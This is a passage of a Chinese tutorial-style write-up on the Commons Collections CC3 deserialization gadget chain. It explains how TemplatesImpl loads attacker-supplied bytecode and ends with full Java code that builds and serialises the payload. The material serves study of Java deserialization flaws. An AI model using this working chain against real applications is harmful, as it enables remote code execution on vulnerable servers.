经过双亲委派后就会寻找类并且加载，也就是对应的`findClass`方法（由于父类是URLClassLoader，所以最后都是走到了`URLClassLoader`的`findClass`方法，如果找到就会调用`defineClass`方法来导入类

![](./img/4382431479157426475.png)

这个方法就是将字节码加载到内存中的，是关键一步：

![](./img/8508089041615603862.png)

以上就是简单的一个类加载过程，当然加载完之后初始化后才能代码执行，这个后面会介绍。

## 反序列化

从上面的分析知道加载类核心是`defineClass`方法，也就是如果能够调用起这个方法，就可以加载类从而动态类加载实现代码执行。所以我们直接从`defineClass`开始搜索：

在`protected final Class<?> defineClass(String name, byte[] b, int off, int
len, ProtectionDomain protectionDomain)`这个重载下发现了如下重载

![](./img/3792891904434022056.png)

可惜上面的两个调用地方都是不支持反序列化的，继续找，

在`protected final Class<?> defineClass(String name, byte[] b, int off, int
len)`这个重载下发现了在非ClassLoader包下的存在`defineClass`类

![](./img/8461416821950000209.png)

![](./img/1213707991593489065.png)

其中的util类下面是ClassLoader，不可以反序列化

最后位于`com.sun.org.apache.xalan.internal.xsltc.trax`包下的`TemplatesImpl`不负众望，继承了`Serializable`接口：

![](./img/6370657012358233990.png)

下面就开始对这个对象进行分析

在这个类中的`private void defineTransletClasses()`调用了`defineClass`方法。

查看这个能调用这个类的地方，有三个：

![](./img/7400998325592953039.png)

我们依次查看发现最后一个`getTransletInstance()`很好用，不经加载了类，而且实例化了

![](./img/3672749275388621257.png)

那么现在我们继续查看调用这个方法的地方

发现之后一个地方调用了`getTransletInstance()`：

![](./img/7935635291371772434.png)

而这个方法`newTransformer()`是公开的，也就是说触发了这个方法就可以任意代码执行了

![](./img/3605449619698292941.png)

这时候就可以使用`InvokerTransformer()`来构造方法，就可以直接触发类加载。

将上面了过程重新梳理一下得到：

![](./img/6347700552002273970.png)

## 流程链

查看这个`TemplatesImpl`类的构造器：

![](./img/8959389106789079071.png)

发现是空的，所以在本地构造链子的时候需要使用反射进行赋值

写出主要的部分：

    
    
    TemplatesImpl templates = new TemplatesImpl();
    templates.newTransformer();
    

进入newTransformer方法中查看，

![](./img/8856360657669337602.png)

人家是直接调用`getTransletInstance`

进入`getTransletInstance()`

发现会判断 `_name`和 `_class`的值

![](./img/5380239307197027674.png)

我们需要人家进入definTransletClasses方法，所以这个地方`_name`需要赋值`_class`不能赋值

进入`defineTransletClasses()`方法

![](./img/3433213604548124230.png)

可以看出人家是循环对`_bytecodes`进行载入的，

![](./img/3410675952644227357.png)

从定义也可以看出来`_bytecodes`是二维数组

然后针对性的修改值：

    
    
    TemplatesImpl templates = new TemplatesImpl();
            Class c = templates.getClass();
            Field nameField= c.getDeclaredField("_name");
            nameField.setAccessible(true);
            // 设置name值
            nameField.set(templates,"111");
            Field bytecodesField = c.getDeclaredField("_bytecodes");
            bytecodesField.setAccessible(true);
            bytecodesField.set(templates,new byte[][]{Files.readAllBytes(Paths.get("D:\\Exec.class"))} );
    
    
            templates.newTransformer();
    

这时候运行的基本逻辑就没有问题了，但是运行的时候会触发空指针错误：

通过调试发现是在defineTransletClasses中触发的：

![](./img/7924399869835862001.png)

显示是这个`_tfactory`不存在

![](./img/7652031091317282893.png)

从变量可以看出这个量是`transient`的无法直接被反序列化，但是会用到，说明会在readObject中赋值的：

![](./img/6090558969669332806.png)

所以说当我们进行反序列化的时候这个链子的时候这个问题不会触发，但是现在我们直接调用就会触发，这里简单修复一下：

    
    
    //修复调试的时候不能用的问题
    Field tfactoryField = c.getDeclaredField("_tfactory");
    tfactoryField.setAccessible(true);
    tfactoryField.set(templates,new TransformerFactoryImpl());
    

然后继续运行，结果仍然会有一个报错，同样也是空指针错误，定位到错误点：

![](./img/1300985789010636740.png)

这个地方是已经调用完defineClass后的步骤中触发的一个错误，这时候还没有触发初始化语句，所以这个错误我们也需要修复掉

错误是在422行触发的，我们可以选择给`_auxClasses`赋值，或者让if跳转到上面语句中

我们注意到后面还有一个报错的判断，也需要跳过，为了方便我们就直接修改上面的跳转，让它修改`_transletIndex`值，也就顺便跳过了后面的错误

修复这个异常也十分简单，只需要让这个类的父类是指定类即可：

![](./img/2081954894746261913.png)

之后运行即可触发类加载，然后代码执行。

## 补全代码

对于前半部分我们可以使用CC1或者CC6中的前半部分，这里我是用了CC6中的前半部分，得到最终代码：

    
    
    TemplatesImpl templates = new TemplatesImpl();
            Class c = templates.getClass();
            Field nameField= c.getDeclaredField("_name");
            nameField.setAccessible(true);
            // 设置name值
            nameField.set(templates,"111");
            Field bytecodesField = c.getDeclaredField("_bytecodes");
            bytecodesField.setAccessible(true);
            bytecodesField.set(templates,new byte[][]{Files.readAllBytes(Paths.get("D:\\Exec.class"))} );
    
            //修复调试的时候不能用的问题
    //        Field tfactoryField = c.getDeclaredField("_tfactory");
    //        tfactoryField.setAccessible(true);
    //        tfactoryField.set(templates,new TransformerFactoryImpl());
            //templates.newTransformer();
    
            Transformer[]  transformer = {
                    new ConstantTransformer(templates),
                    new InvokerTransformer("newTransformer", null, null),
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
    
    
    
            HashMap<Objects, Objects> hashLazyMap = new HashMap<>();
    
            //防止序列化的时候触发漏洞
            LazyMap lazyMap  = (LazyMap) LazyMap.decorate(hashLazyMap,new ConstantTransformer(1));
    
            //TideMapEntry
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "111");
    
            //new一个用来触发hashCode的HashCode
            HashMap<TiedMapEntry, String> hashMap = new HashMap<>();
            //将需要触发hashCode的Entry作为key传入其中，他的值无所谓
            hashMap.put(tiedMapEntry, "222");
    
            //重新修理这个链接
            Class LazyMapClass = LazyMap.class;
            Field factoryfield = LazyMapClass.getDeclaredField("factory");
            factoryfield.setAccessible(true);
            factoryfield.set(lazyMap,chainedTransformer);
    
            lazyMap.remove("111");
    
            Util.serialzie(hashMap,"CC3.bin");
            Util.unserialize("CC3.bin");
    

# 总结

本文分析了经典的CC1，通过CC6和CC3将CC1进行了替换从而得到了截然不同的两条链子，虽然本次只是提到了三个链子和一个额外发现的类，但是经过组合却能得到6种不同的链子：

![](./img/548231460135938779.png)

在这次的分析中更多讲的是各个链寻找的思路，后面剩下的几条链子也都是在此基础上不断修正修改的。

CC1链给了我们一条反序列化的模板，CC6链则是提供了不同的触发方式，CC3链则用了不同的命令执行思路。当我们看完文章后在此回到开头就会理解为什么
**同名不同类方法** 在反序列化中起到重要作用，同时我们也对开头提到的寻找常见同命不同类的三种方法进行了演示，也希望师傅们能多多发现新的漏洞。

最后我也是新手，难免文笔垃圾，措辞轻浮，内容浅显，操作生疏，如有不足之处欢迎各位大师傅们只带你和纠正，感激不尽。

